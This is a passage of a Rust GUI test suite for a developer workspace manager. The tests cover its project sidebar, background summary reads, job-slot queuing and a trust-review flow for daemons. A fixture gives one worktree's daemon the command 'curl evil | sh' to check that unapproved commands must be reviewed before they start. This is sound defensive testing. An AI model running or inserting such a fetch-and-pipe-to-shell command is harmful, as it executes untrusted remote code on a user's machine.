        ThemeChoice::Dark
    );
    let toasts = cx
        .update_window(h.window.into(), |_, window, cx| {
            window.notifications(cx).len()
        })
        .unwrap();
    assert_eq!(toasts, 1, "the failure is reported");
}

#[gpui_kit::test]
fn a_saved_form_is_not_overwritten_by_an_older_theme_write(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});
    let file = cx.read_entity(&h.state, |s, _| s.settings_file().unwrap().to_path_buf());
    // A theme change is waiting for its background write ...
    cx.update_window(h.window.into(), |_, window, cx| {
        h.state
            .update(cx, |s, cx| s.set_theme(ThemeChoice::Dark, window, cx))
    })
    .unwrap();
    // ... when the Settings form saves other settings.
    let form = Settings {
        editor_command: "zed".into(),
        theme: ThemeChoice::Dark,
        ..Settings::default()
    };
    update(cx, &h, |s, _| s.store_settings(form.clone())).unwrap();
    cx.run_until_parked();
    let saved = std::fs::read_to_string(&file).unwrap();
    assert_eq!(toml::from_str::<Settings>(&saved).unwrap(), form);
    assert_eq!(cx.read_entity(&h.state, |s, _| s.settings.clone()), form);
    let _ = std::fs::remove_dir_all(file.parent().unwrap());
}

#[gpui_kit::test]
fn the_theme_follows_the_os_only_while_the_setting_is_system(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});
    // The OS (the test platform) is light.
    let follow = |cx: &mut TestAppContext| {
        cx.update_window(h.window.into(), |_, window, cx| {
            h.state
                .update(cx, |s, cx| s.follow_system_appearance(window, cx))
        })
        .unwrap();
    };

    cx.update(|cx| Theme::change(ThemeMode::Dark, None, cx));
    assert!(is_dark(cx));
    follow(cx);
    assert!(!is_dark(cx), "System follows the OS");

    cx.update_window(h.window.into(), |_, window, cx| {
        h.state
            .update(cx, |s, cx| s.set_theme(ThemeChoice::Dark, window, cx))
    })
    .unwrap();
    follow(cx);
    assert!(is_dark(cx), "an explicit choice stays");
}

/// "shop" (loaded, selected, unfolded) and "blog" (unfolded, workspaces read).
fn shop_and_blog(state: &mut AppState) {
    install_loaded(state);
    let shop = state.selection.current().unwrap().key.project;
    let blog = blog_entry();
    let summary = |list| ProjectSummary {
        workspaces: list,
        loaded: true,
        ..Default::default()
    };
    let shop_summary = summary(workspace_summaries(
        &state.selection.current().unwrap().workspaces,
    ));
    state.summaries.insert(shop, shop_summary);
    state.summaries.insert(
        blog.id,
        summary(vec![
            WorkspaceSummary {
                name: "main".into(),
                state: WorkspaceState::Ready,
                is_default: true,
            },
            WorkspaceSummary {
                name: "wip".into(),
                state: WorkspaceState::InProgress,
                is_default: false,
            },
        ]),
    );
    state.expanded = [shop, blog.id].into();
    state.entries.push(blog);
}

fn ids(cx: &mut TestAppContext, h: &Harness) -> (Uuid, Uuid) {
    cx.read_entity(&h.state, |s, _| (s.entries[0].id, s.entries[1].id))
}

#[gpui_kit::test]
fn the_sidebar_is_a_tree_of_projects_and_their_workspaces(cx: &mut TestAppContext) {
    let h = open(cx, shop_and_blog);
    let (shop, blog) = ids(cx, &h);
    frame(cx, &h, |window| {
        for id in [
            project_id(shop),
            workspace_id(shop, "main"),
            workspace_id(shop, "feature-x"),
            workspace_id(shop, "adopted"),
            new_workspace_id(shop),
            project_id(blog),
            workspace_id(blog, "main"),
            workspace_id(blog, "wip"),
            new_workspace_id(blog),
        ] {
            assert!(window.find(id.clone()).visible(), "{id} is in the tree");
        }
        // Workspaces are indented under their project.
        assert!(
            window.find(workspace_id(shop, "main")).bounds().left()
                > window.find(project_id(shop)).bounds().left()
        );
    });

    // Clicking a workspace of the shown project selects its row in the table.
    cx.update_window(h.window.into(), |_, window, cx| {
        window.click(workspace_id(shop, "feature-x"), cx)
    })
    .unwrap();
    cx.run_until_parked();
    let (selected, row) = cx.read_entity(&h.shell, |shell, cx| {
        let state = shell.state.read(cx);
        let table = &shell.project.read(cx).workspaces.read(cx).table;
        (
            state
                .selection
                .current()
                .unwrap()
                .selected_workspace
                .clone(),
            table.read(cx).selected_row(),
        )
    });
    assert_eq!(selected.as_deref(), Some("feature-x"));
    assert_eq!(row, Some(1), "the table highlights that workspace");

    // A workspace of another project selects the project, on the Workspaces tab.
    update(cx, &h, |s, _| s.tab = Tab::Logs);
    cx.update_window(h.window.into(), |_, window, cx| {
        window.click(workspace_id(blog, "wip"), cx)
    })
    .unwrap();
    cx.run_until_parked();
    let (project, workspace, page_tab) = cx.read_entity(&h.state, |s, _| {
        let model = s.selection.current().unwrap();
        (
            model.key.project,
            model.selected_workspace.clone(),
            (s.page, s.tab),
        )
    });
    assert_eq!(project, blog);
    assert_eq!(workspace.as_deref(), Some("wip"));
    assert_eq!(page_tab, (Page::Project, Tab::Workspaces));
    assert!(
        cx.read_entity(&h.state, |s, _| s.is_expanded(shop)),
        "shop stays unfolded"
    );

    // Clicking the project that is shown folds it, and again unfolds it.
    cx.update_window(h.window.into(), |_, window, cx| {
        window.click(project_id(blog), cx)
    })
    .unwrap();
    frame(cx, &h, |window| {
        assert!(window.try_find(workspace_id(blog, "wip")).is_none());
        assert!(window.try_find(new_workspace_id(blog)).is_none());
        assert!(window.try_find(workspace_id(shop, "main")).is_some());
    });
    cx.update_window(h.window.into(), |_, window, cx| {
        window.click(project_id(blog), cx)
    })
    .unwrap();
    frame(cx, &h, |window| {
        assert!(window.find(workspace_id(blog, "wip")).visible());
    });
}

#[gpui_kit::test]
fn the_new_workspace_row_of_a_project_waits_for_it_to_load(cx: &mut TestAppContext) {
    let h = open(cx, shop_and_blog);
    let (shop, blog) = ids(cx, &h);
    let project = cx.read_entity(&h.state, |s, _| {
        s.selection.current().unwrap().project.clone()
    });
    frame(cx, &h, |_| {});

    // The selected, loaded project opens the form at once.
    cx.update_window(h.window.into(), |_, window, cx| {
        window.click(new_workspace_id(shop), cx)
    })
    .unwrap();
    cx.run_until_parked();
    assert!(dialog_is_open(cx, &h));
    press_key(cx, &h, "escape");

    // Another project is selected first; the form follows once it is loaded.
    cx.update_window(h.window.into(), |_, window, cx| {
        window.click(new_workspace_id(blog), cx)
    })
    .unwrap();
    cx.run_until_parked();
    assert_eq!(
        cx.read_entity(&h.state, |s, _| s.selection.current().unwrap().key.project),
        blog
    );
    assert!(!dialog_is_open(cx, &h), "its workspaces are not known yet");

    let loaded = Refreshed {
        project: project.unwrap(),
        workspaces: Ok(vec![WorkspaceStatus {
            workspace: workspace("main", true),
            receipt: None,
            status: None,
            busy: false,
        }]),
        database: DatabaseModel::default(),
        services: crate::services::ServicesModel::default(),
        trust: Ok(TrustState::Trusted),
        pitchfork: None,
        config: None,
        logs: None,
    };
    update(cx, &h, |s, cx| {
        let stamp = s.selection.current_mut().unwrap().begin_refresh();
        s.apply_refresh(stamp, false, Ok(loaded), cx)
    });
    cx.run_until_parked();
    assert!(
        dialog_is_open(cx, &h),
        "the form opened when the project loaded"
    );
    // And what the refresh read is what the sidebar lists.
    let names = cx.read_entity(&h.state, |s, _| {
        s.summaries[&blog]
            .workspaces
            .iter()
            .map(|w| w.name.clone())
            .collect::<Vec<_>>()
    });
    assert_eq!(names, ["main"]);
}

#[gpui_kit::test]
fn a_new_workspace_is_not_waited_for_in_a_project_that_cannot_load(cx: &mut TestAppContext) {
    let h = open(cx, shop_and_blog);
    let (_, blog) = ids(cx, &h);
    frame(cx, &h, |_| {});
    update(cx, &h, |s, cx| s.request_new_workspace(Some(blog), cx));
    let failed = Err(LoadError::NotInitialized);
    update(cx, &h, |s, cx| {
        let stamp = s.selection.current_mut().unwrap().begin_refresh();
        s.apply_refresh(stamp, false, failed, cx)
    });
    cx.run_until_parked();
    assert!(!dialog_is_open(cx, &h), "nothing to create a workspace in");
    let error = cx.read_entity(&h.state, |s, _| s.summaries[&blog].error.clone());
    assert_eq!(error.as_deref(), Some("not initialized"));
}

#[gpui_kit::test]
fn a_refresh_of_the_selected_project_updates_its_sidebar_summary(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    let shop = cx.read_entity(&h.state, |s, _| s.selection.current().unwrap().key.project);
    let result: Result<Refreshed, LoadError> = Ok(refreshed(&h, cx, "web"));
    update(cx, &h, |s, cx| {
        s.inflight = MAX_JOBS + 1;
        let stamp = s.selection.current_mut().unwrap().begin_refresh();
        s.apply_refresh(stamp, false, result, cx)
    });
    let list = cx.read_entity(&h.state, |s, _| s.summaries[&shop].clone());
    assert!(list.loaded && list.error.is_none());
    let seen: Vec<_> = list
        .workspaces
        .iter()
        .map(|w| (w.name.as_str(), w.state, w.is_default))
        .collect();
    assert_eq!(
        seen,
        [
            ("main", WorkspaceState::Ready, true),
            ("feature-x", WorkspaceState::NeedsAttention, false),
            ("adopted", WorkspaceState::NotSetUp, false),
        ]
    );
}

#[gpui_kit::test]
fn a_summary_read_from_before_a_change_is_dropped(cx: &mut TestAppContext) {
    let h = open(cx, shop_and_blog);
    let (_, blog) = ids(cx, &h);
    let root = PathBuf::from("/tmp/blog");
    let list = |name: &str| {
        vec![WorkspaceSummary {
            name: name.into(),
            state: WorkspaceState::Ready,
            is_default: true,
        }]
    };
    let names = |cx: &mut TestAppContext| {
        cx.read_entity(&h.state, |s, _| {
            s.summaries[&blog]
                .workspaces
                .iter()
                .map(|w| w.name.clone())
                .collect::<Vec<_>>()
        })
    };
    // A read is in flight (of a project that is folded) ...
    let stamp = update(cx, &h, |s, _| {
        s.expanded.remove(&blog);
        let generation = s.summaries.get_mut(&blog).unwrap().begin_read();
        SummaryStamp {
            project: blog,
            root: root.clone(),
            generation,
        }
    });
    // ... when a mutation of that project starts (or a refresh writes it).
    update(cx, &h, |s, _| s.invalidate_summary(blog));
    update(cx, &h, |s, cx| {
        s.apply_summary(stamp.clone(), Ok(list("stale")), cx)
    });
    assert_eq!(names(cx), ["main", "wip"], "the stale read changed nothing");
    assert!(!cx.read_entity(&h.state, |s, _| s.summaries[&blog].is_reading()));

    // A read that is current is applied.
    let current = update(cx, &h, |s, _| SummaryStamp {
        generation: s.summaries[&blog].generation,
        ..stamp.clone()
    });
    update(cx, &h, |s, cx| {
        s.apply_summary(current, Ok(list("fresh")), cx)
    });
    assert_eq!(names(cx), ["fresh"]);

    // One for a project that moved, or was forgotten, is dropped.
    let current = update(cx, &h, |s, _| SummaryStamp {
        generation: s.summaries[&blog].generation,
        ..stamp.clone()
    });
    let moved = SummaryStamp {
        root: PathBuf::from("/tmp/elsewhere"),
        ..current.clone()
    };
    update(cx, &h, |s, cx| {
        s.apply_summary(moved, Ok(list("moved")), cx)
    });
    assert_eq!(names(cx), ["fresh"]);

    // A stale read of a project that is unfolded is made again.
    update(cx, &h, |s, cx| {
        s.expanded.insert(blog);
        let summary = s.summaries.get_mut(&blog).unwrap();
        let stale = SummaryStamp {
            generation: summary.begin_read(),
            ..current.clone()
        };
        summary.invalidate();
        s.apply_summary(stale, Ok(list("stale")), cx)
    });
    assert!(
        cx.read_entity(&h.state, |s, _| s.summaries[&blog].is_reading()),
        "a new read started"
    );
    assert_eq!(names(cx), ["fresh"]);

    update(cx, &h, |s, cx| {
        s.entries.retain(|e| e.id != blog);
        s.summaries.remove(&blog);
        s.apply_summary(current, Ok(list("gone")), cx)
    });
    assert!(cx.read_entity(&h.state, |s, _| !s.summaries.contains_key(&blog)));
}

/// Start a sidebar read of `blog` by hand: what `refresh_summary` does,
/// without a task, so the test decides when it ends.
fn start_summary_read(cx: &mut TestAppContext, h: &Harness, blog: Uuid) -> SummaryStamp {
    update(cx, h, |s, _| {
        s.inflight += 1;
        SummaryStamp {
            project: blog,
            root: PathBuf::from("/tmp/blog"),
            generation: s.summaries.entry(blog).or_default().begin_read(),
        }
    })
}

/// Forget "blog" and add it again (the same id and root), unfolded.
fn remove_and_add_again(cx: &mut TestAppContext, h: &Harness, blog: Uuid) {
    update(cx, h, |s, _| {
        let at = s.entries.iter().position(|e| e.id == blog).unwrap();
        let entry = s.entries.remove(at);
        s.expanded.remove(&blog);
        s.summaries.remove(&blog);
        s.entries.push(entry);
        s.expanded.insert(blog);
    });
}

fn blog_names(cx: &mut TestAppContext, h: &Harness, blog: Uuid) -> Vec<String> {
    cx.read_entity(&h.state, |s, _| {
        s.summaries[&blog]
            .workspaces
            .iter()
            .map(|w| w.name.clone())
            .collect()
    })
}

fn one_workspace(name: &str) -> Vec<WorkspaceSummary> {
    vec![WorkspaceSummary {
        name: name.into(),
        state: WorkspaceState::Ready,
        is_default: true,
    }]
}

#[gpui_kit::test]
fn a_read_from_before_a_project_was_removed_cannot_overwrite_the_one_after_it_was_added(
    cx: &mut TestAppContext,
) {
    let h = open(cx, shop_and_blog);
    let (_, blog) = ids(cx, &h);
    update(cx, &h, |s, _| s.inflight = 0);

    // A read is running when the project is removed and added again; the new
    // entry starts its own read.
    let old = start_summary_read(cx, &h, blog);
    remove_and_add_again(cx, &h, blog);
    let new = start_summary_read(cx, &h, blog);
    assert_ne!(old.generation, new.generation, "an identity is not reused");

    // The new read ends first, the old one last: it must not win.
    update(cx, &h, |s, cx| {
        s.apply_summary(new, Ok(one_workspace("fresh")), cx)
    });
    assert_eq!(blog_names(cx, &h, blog), ["fresh"]);
    update(cx, &h, |s, cx| {
        s.apply_summary(old, Ok(one_workspace("stale")), cx)
    });
    assert_eq!(
        blog_names(cx, &h, blog),
        ["fresh"],
        "the old read is dropped"
    );
}

#[gpui_kit::test]
fn an_old_read_ending_does_not_hide_the_new_one_that_is_running(cx: &mut TestAppContext) {
    let h = open(cx, shop_and_blog);
    let (_, blog) = ids(cx, &h);
    update(cx, &h, |s, _| s.inflight = 0);

    let old = start_summary_read(cx, &h, blog);
    remove_and_add_again(cx, &h, blog);
    let new = start_summary_read(cx, &h, blog);

    // The old read ends while the new one runs: it is dropped, and the new
    // one is still the read in flight (so no second read starts beside it).
    update(cx, &h, |s, cx| {
        s.apply_summary(old, Ok(one_workspace("stale")), cx)
    });
    cx.read_entity(&h.state, |s, _| {
        assert!(s.summaries[&blog].is_reading(), "the new read is running");
        assert_eq!(s.inflight, 1, "one read, one slot");
    });
    assert!(blog_names(cx, &h, blog).is_empty());

    update(cx, &h, |s, cx| {
        s.apply_summary(new, Ok(one_workspace("fresh")), cx)
    });
    assert_eq!(blog_names(cx, &h, blog), ["fresh"]);
    cx.read_entity(&h.state, |s, _| {
        assert!(!s.summaries[&blog].is_reading());
        assert_eq!(s.inflight, 0);
    });
}

#[gpui_kit::test]
fn a_read_waiting_for_a_job_slot_starts_when_one_frees_and_only_if_still_wanted(
    cx: &mut TestAppContext,
) {
    let h = open(cx, shop_and_blog);
    let (_, blog) = ids(cx, &h);
    // Every slot is taken: the read waits, once.
    update(cx, &h, |s, cx| {
        s.summaries.remove(&blog);
        s.refresh_summary(blog, cx);
        s.refresh_summary(blog, cx);
    });
    cx.read_entity(&h.state, |s, _| {
        assert_eq!(s.pending_summaries, [blog]);
        assert!(!s.summaries.contains_key(&blog), "nothing started");
    });

    // A slot frees, but the project was folded meanwhile.
    update(cx, &h, |s, cx| {
        s.expanded.remove(&blog);
        s.inflight = MAX_JOBS - 1;
        s.start_queued_summaries(cx);
    });
    cx.read_entity(&h.state, |s, _| {
        assert!(s.pending_summaries.is_empty());
        assert!(
            !s.summaries.contains_key(&blog),
            "a folded project is not read"
        );
        assert_eq!(s.inflight, MAX_JOBS - 1);
    });

    // Unfolded again with no slot free, then a slot frees: now it is read.
    update(cx, &h, |s, cx| {
        s.inflight = MAX_JOBS;
        s.toggle_expanded(blog, cx);
        assert_eq!(s.pending_summaries, [blog]);
        s.inflight = MAX_JOBS - 1;
        s.start_queued_summaries(cx);
    });
    cx.read_entity(&h.state, |s, _| {
        assert!(s.pending_summaries.is_empty());
        assert!(s.summaries[&blog].is_reading(), "the queued read started");
        assert_eq!(s.inflight, MAX_JOBS);
    });
}

#[gpui_kit::test]
fn a_refresh_reads_every_unfolded_project_even_with_few_job_slots(cx: &mut TestAppContext) {
    let scratch = scratch_project();
    let others: Vec<Entry> = (0..4)
        .map(|i| another_scratch_project(&scratch, &format!("project-{i}")))
        .collect();
    let h = open_scratch(cx, &scratch);
    // Five unfolded projects (the selected one and four more), whose
    // workspaces were read before and are out of date now.
    update(cx, &h, |s, _| {
        s.expanded.insert(scratch.entry.id);
        for entry in &others {
            s.entries.push(entry.clone());
            s.expanded.insert(entry.id);
            s.summaries.insert(
                entry.id,
                ProjectSummary {
                    workspaces: one_workspace("out-of-date"),
                    loaded: true,
                    ..Default::default()
                },
            );
        }
    });
    let current = |s: &AppState, entry: &Entry| {
        let list = &s.summaries[&entry.id].workspaces;
        list.len() == 1 && list[0].name != "out-of-date"
    };

    update(cx, &h, |s, cx| {
        s.refresh_all(cx);
        s.refresh_all(cx);
    });
    cx.read_entity(&h.state, |s, _| {
        let reading = others
            .iter()
            .filter(|e| s.summaries[&e.id].is_reading())
            .count();
        assert_eq!(s.inflight, MAX_JOBS, "the selected project and three reads");
        assert_eq!(reading, MAX_JOBS - 1);
        assert_eq!(s.pending_summaries.len(), 1, "the fourth waits, once");
    });

    settle(cx, &h, |s| {
        s.inflight == 0 && others.iter().all(|entry| current(s, entry))
    });
    cx.read_entity(&h.state, |s, _| assert!(s.pending_summaries.is_empty()));
}

#[gpui_kit::test]
fn unfolding_a_project_reads_its_workspaces_off_the_ui_thread(cx: &mut TestAppContext) {
    let scratch = scratch_project();
    let other = another_scratch_project(&scratch, "blog");
    let h = open_scratch(cx, &scratch);
    update(cx, &h, |s, _| s.entries.push(other.clone()));
    assert!(!cx.read_entity(&h.state, |s, _| s.summaries.contains_key(&other.id)));

    update(cx, &h, |s, cx| s.toggle_expanded(other.id, cx));
    assert!(
        cx.read_entity(&h.state, |s, _| s.summaries[&other.id].is_reading()),
        "the read started in the background"
    );
    settle(cx, &h, |s| {
        s.summaries.get(&other.id).is_some_and(|p| p.loaded)
    });
    let (list, inflight) = cx.read_entity(&h.state, |s, _| {
        (s.summaries[&other.id].clone(), s.inflight)
    });
    assert_eq!(list.workspaces.len(), 1);
    assert!(list.workspaces[0].is_default);
    assert!(!list.is_reading());
    assert_eq!(inflight, 0, "the job slot was given back");

    // The selected project is never read separately: its refreshes cover it.
    update(cx, &h, |s, cx| s.toggle_expanded(scratch.entry.id, cx));
    update(cx, &h, |s, cx| s.toggle_expanded(scratch.entry.id, cx));
    assert!(!cx.read_entity(&h.state, |s, _| {
        s.summaries
            .get(&scratch.entry.id)
            .is_some_and(|p| p.is_reading())
    }));
}

#[gpui_kit::test]
fn the_empty_states_offer_what_to_do_next(cx: &mut TestAppContext) {
    let h = open(cx, |_| {});
    frame(cx, &h, |window| {
        assert!(window.find("add-project").visible(), "no projects: add one");
    });
    update(cx, &h, |s, cx| {
        s.entries_error = Some("cannot read the registry".into());
        cx.notify();
    });
    frame(cx, &h, |window| {
        assert!(window.find("retry-projects").visible());
    });
}

// --- processes: the Daemons tab and per-workspace trust ---------------------------

/// Replace the selected project's pitchfork model and show the Daemons tab.
fn show_daemons(cx: &mut TestAppContext, h: &Harness, model: PitchforkModel) {
    update(cx, h, |s, cx| {
        s.tab = Tab::Daemons;
        s.selection.current_mut().unwrap().pitchfork = model;
        cx.notify();
    });
    frame(cx, h, |_| {});
}

fn status_mut(model: &mut PitchforkModel) -> &mut ProcessStatus {
    model.status.as_mut().unwrap()
}

fn notice(window: &gpui_kit::Window, id: &'static str) -> bool {
    window.try_find(id).is_some_and(|e| e.visible())
}

/// What the toolbar and the first two rows may do, as the view computes it.
fn gates(status: &ProcessStatus, busy: bool) -> (bool, bool, bool, bool, bool, bool) {
    use super::processes::{actions, row_can_start};
    let a = actions(status, busy);
    (
        a.start,
        a.review,
        a.stop,
        a.restart,
        row_can_start(&status.daemons[0], busy),
        row_can_start(&status.daemons[1], busy),
    )
}

#[gpui_kit::test]
fn the_daemons_tab_enables_its_buttons_only_where_core_allows_the_action(cx: &mut TestAppContext) {
    use devflow_core::{processes::Action, trust::Trigger};
    let h = open(cx, install_loaded);
    let daemons = cx.read_entity(&h.state, |s, _| {
        s.selection.current().unwrap().pitchfork.clone()
    });
    let status = |model: &PitchforkModel| model.status.clone().unwrap();
    let buttons = |window: &gpui_kit::Window| {
        for id in ["daemons-start", "daemons-stop", "daemons-restart"] {
            assert!(window.find(id).visible(), "{id} is laid out");
        }
        assert!(window.find(("daemon-start", 0usize)).visible());
        assert!(window.find(("daemon-start", 1usize)).visible());
    };

    // Everything is allowed: the running daemon can be stopped, the other started.
    // (start, review, stop, restart, row 0 = web is running, row 1 = api)
    assert_eq!(
        gates(&status(&daemons), false),
        (true, false, true, true, false, true)
    );
    show_daemons(cx, &h, daemons.clone());
    frame(cx, &h, |window| {
        buttons(window);
        assert!(window.find(("daemon-url", 0usize)).visible());
        assert!(!notice(window, "start-note") && !notice(window, "autostart-note"));
        assert!(!notice(window, "pitchfork-install"), "pitchfork is usable");
    });

    // Not approved: starting goes through a review, stopping is refused.
    let mut model = daemons.clone();
    {
        let status = status_mut(&mut model);
        status.can_start = refused(Refusal::NotApproved {
            action: Action::Start,
            changed: true,
            format_changed: false,
        });
        status.can_stop = refused(Refusal::NotApproved {
            action: Action::Stop,
            changed: true,
            format_changed: false,
        });
        for d in &mut status.daemons {
            d.startable = false;
        }
    }
    assert_eq!(
        gates(&status(&model), false),
        (true, true, false, false, false, false),
        "'Review and start…' is the one way forward"
    );
    show_daemons(cx, &h, model);
    frame(cx, &h, |window| {
        buttons(window);
        assert!(notice(window, "start-note"), "core's reason is shown");
        assert!(notice(window, "stop-note"));
    });

    // A daemon that starts on its own: no bulk start, and autostart says why it is off.
    let mut model = daemons.clone();
    {
        let status = status_mut(&mut model);
        status.can_start = refused(Refusal::AutonomousTriggers {
            triggers: vec![Trigger {
                file: "pitchfork.toml".into(),
                daemon: "tick".into(),
                trigger: "cron".into(),
            }],
        });
        status.autostart = true;
        status.autostart_blocked =
            Some("autostart is off for this workspace: tick (cron) start on their own".into());
        status.daemons[0].triggers = vec!["cron".into()];
    }
    assert_eq!(
        gates(&status(&model), false),
        (false, false, true, false, false, true),
        "no bulk start, but a plain daemon by name"
    );
    show_daemons(cx, &h, model);
    frame(cx, &h, |window| {
        buttons(window);
        assert!(notice(window, "autostart-note"));
        assert!(notice(window, "start-note"));
    });

    // Not ready: nothing starts.
    let mut model = daemons.clone();
    {
        let status = status_mut(&mut model);
        status.can_start = refused(Refusal::NotReady {
            status: "needs_attention".into(),
            detail: None,
        });
        status.daemons[1].startable = false;
    }
    assert_eq!(
        gates(&status(&model), false),
        (false, false, true, false, false, false)
    );
    show_daemons(cx, &h, model);
    frame(cx, &h, |window| {
        buttons(window);
        assert!(notice(window, "start-note"));
    });

    // A running job disables every control.
    assert_eq!(
        gates(&status(&daemons), true),
        (false, false, false, false, false, false)
    );
    show_daemons(cx, &h, daemons);
    update(cx, &h, |s, cx| {
        let project = s.selection.current().unwrap().key.project;
        s.mutating.insert(project, "Set up main".into());
        cx.notify();
    });
    frame(cx, &h, |window| buttons(window));
}

#[gpui_kit::test]
fn a_missing_pitchfork_shows_the_commands_to_install_it_and_never_runs_them(
    cx: &mut TestAppContext,
) {
    let h = open(cx, install_loaded);
    for detection in [
        // Nothing on PATH.
        Detection {
            path: None,
            installed: false,
            version: None,
            missing_features: Vec::new(),
            problem: None,
        },
        // A mise shim without a version: on PATH, executable, exits 1.
        Detection {
            path: Some(PathBuf::from("/Users/me/.local/share/mise/shims/pitchfork")),
            installed: false,
            version: None,
            missing_features: Vec::new(),
            problem: Some("mise ERROR No version is set for shim: pitchfork".into()),
        },
    ] {
        show_daemons(
            cx,
            &h,
            PitchforkModel {
                loaded: true,
                install: Some(devflow_core::pitchfork::install_plan()),
                detection: Some(detection),
                status: None,
                all: Vec::new(),
                error: None,
            },
        );
        frame(cx, &h, |window| {
            assert!(window.find("pitchfork-install").visible());
            assert!(window.find(("copy-install", 0usize)).visible());
            assert!(!notice(window, "daemons-start"), "nothing to start with");
        });
    }
    // The first command is copied; nothing is run.
    cx.update_window(h.window.into(), |_, window, cx| {
        window.click(("copy-install", 0usize), cx)
    })
    .unwrap();
    let copied = cx.update(|cx| cx.read_from_clipboard().and_then(|item| item.text()));
    let plan = devflow_core::pitchfork::install_plan();
    assert_eq!(copied.as_deref(), plan.commands.first().map(String::as_str));

    // A build without the features devflow calls is named.
    show_daemons(
        cx,
        &h,
        PitchforkModel {
            loaded: true,
            install: Some(plan),
            detection: Some(Detection {
                path: Some(PathBuf::from("/usr/local/bin/pitchfork")),
                installed: true,
                version: Some("2.1.0".into()),
                missing_features: vec!["start --local".into()],
                problem: None,
            }),
            status: Some(process_status("main", "/tmp/shop/main", Vec::new())),
            all: Vec::new(),
            error: None,
        },
    );
    frame(cx, &h, |window| {
        assert!(window.find("pitchfork-install").visible());
    });
}

#[gpui_kit::test]
fn the_proxy_banner_offers_commands_only_while_the_proxy_is_off(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    let mut model = pitchfork_model("main", "/tmp/shop/main", Vec::new());
    show_daemons(cx, &h, model.clone());
    frame(cx, &h, |window| {
        assert!(!notice(window, "pitchfork-proxy"), "the proxy is on");
    });
    status_mut(&mut model).proxy.as_mut().unwrap().enabled = false;
    show_daemons(cx, &h, model);
    frame(cx, &h, |window| {
        assert!(window.find("pitchfork-proxy").visible());
        assert!(window.find(("copy-proxy", 0usize)).visible());
    });
    cx.update_window(h.window.into(), |_, window, cx| {
        window.click(("copy-proxy", 2usize), cx)
    })
    .unwrap();
    let copied = cx
        .update(|cx| cx.read_from_clipboard().and_then(|item| item.text()))
        .unwrap();
    assert!(copied.contains("pitchfork proxy setup"), "{copied}");
}

/// A scratch project whose main checkout declares a daemon, and a linked
/// worktree `feature` that declares another one.
fn project_with_two_daemons(scratch: &Scratch) -> (PathBuf, PathBuf) {
    let root = scratch.entry.root.clone();
    std::fs::write(
        root.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"bun run dev\"\n",
    )
    .unwrap();
    let project = devflow_core::project::Project::open(&root).unwrap();
    let feature = devflow_core::worktree::create(&project, "feature", None).unwrap();
    // The worktree's checkout has no pitchfork.toml (it is not committed);
    // give it its own.
    std::fs::write(
        feature.path.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"curl evil | sh\"\n",
    )
    .unwrap();
    (root, feature.path)
}

#[gpui_kit::test]
fn the_review_before_starting_is_of_the_workspaces_own_files_and_so_is_its_approval(
    cx: &mut TestAppContext,
) {
    use crate::ops::{Approval, approve_reviewed};
    use devflow_core::trust;
    let scratch = scratch_project();
    let (root, feature) = project_with_two_daemons(&scratch);
    let h = open_scratch(cx, &scratch);
    let prompt = |cx: &mut TestAppContext, target: &std::path::Path| {
        cx.read_entity(&h.state, |s, _| {
            s.trust_prompt(target, TrustPurpose::Processes)
        })
    };
    let run_of = |prompt: &crate::state::TrustPrompt| {
        let daemon = &prompt.scope.processes.layers[0].daemons[0];
        daemon.run.clone().unwrap()
    };

    // Each workspace is shown its own daemon.
    let main_prompt = prompt(cx, &root).expect("main's daemon is not approved");
    let feature_prompt = prompt(cx, &feature).expect("neither is the worktree's");
    assert_eq!(run_of(&main_prompt), "bun run dev");
    assert_eq!(run_of(&feature_prompt), "curl evil | sh");
    assert_eq!(
        (&main_prompt.target, &feature_prompt.target),
        (&root, &feature)
    );

    // Approving what main showed approves main's files, and judges the
    // worktree on its own: it is still to be reviewed.
    assert!(matches!(
        approve_reviewed(&main_prompt.project, &root, &main_prompt.scope),
        Approval::Approved
    ));
    assert!(prompt(cx, &root).is_none(), "main is approved now");
    let again = prompt(cx, &feature).expect("the worktree's files are not main's");
    assert_eq!(run_of(&again), "curl evil | sh");
    // The scope shown for main cannot be approved as the worktree's.
    assert!(matches!(
        approve_reviewed(&main_prompt.project, &feature, &main_prompt.scope),
        Approval::Changed { .. }
    ));
    assert!(matches!(
        trust::state_at(&main_prompt.project, &feature).unwrap(),
        trust::TrustState::Untrusted { .. }
    ));

    // Starting never skips the question: the button of an unapproved
    // workspace opens the review of that workspace.
    update(cx, &h, |s, cx| {
        s.inflight = MAX_JOBS;
        s.tab = Tab::Daemons;
        let model = s.selection.current_mut().unwrap();
        model.selected_workspace = Some("feature".into());
        let mut status = process_status("feature", feature.to_str().unwrap(), Vec::new());
        status.can_start = refused(Refusal::NotApproved {
            action: devflow_core::processes::Action::Start,
            changed: false,
            format_changed: false,
        });
        model.pitchfork = PitchforkModel {
            loaded: true,
            detection: Some(installed()),
            install: None,
            status: Some(status),
            all: Vec::new(),
            error: None,
        };
        cx.notify();
    });
    frame(cx, &h, |_| {});
    cx.update_window(h.window.into(), |_, window, cx| {
        window.click("daemons-start", cx)
    })
    .unwrap();
    frame(cx, &h, |window| {
        assert!(window.find("trust").visible(), "the review opened");
        assert!(
            window.find("trust-processes-1").visible(),
            "it lists the worktree's pitchfork file"
        );
    });
}

#[gpui_kit::test]
fn the_trust_badge_follows_the_selected_workspace(cx: &mut TestAppContext) {
    use crate::{jobs::RefreshRequest, model::WorkspaceTarget};
    use devflow_core::trust;
    let scratch = scratch_project();
    let (root, feature) = project_with_two_daemons(&scratch);
    let project = devflow_core::project::Project::open(&root).unwrap();
    trust::approve(&project).unwrap();
    let judged = |dir: &std::path::Path| {
        let git_dir = if dir == root {
            root.join(".git")
        } else {
            dir.join(".git")
        };
        jobs::refresh(RefreshRequest {
            root: root.clone(),
            listed: None,
            load_config: false,
            workspace: Some(WorkspaceTarget {
                path: dir.to_path_buf(),
                git_dir,
            }),
            processes: crate::jobs::ProcessWant::No,
            want_logs: false,
            selected_log: None,
            pitchfork: jobs::PitchforkSource::OnPath,
            services: jobs::ServicesRead::counts(),
        })
        .ok()
        .expect("refresh")
        .trust
    };
    // The same project, two answers: main is approved, the worktree is not.
    assert_eq!(judged(&root).unwrap(), TrustState::Trusted);
    assert!(matches!(
        judged(&feature).unwrap(),
        TrustState::Untrusted { .. }
    ));

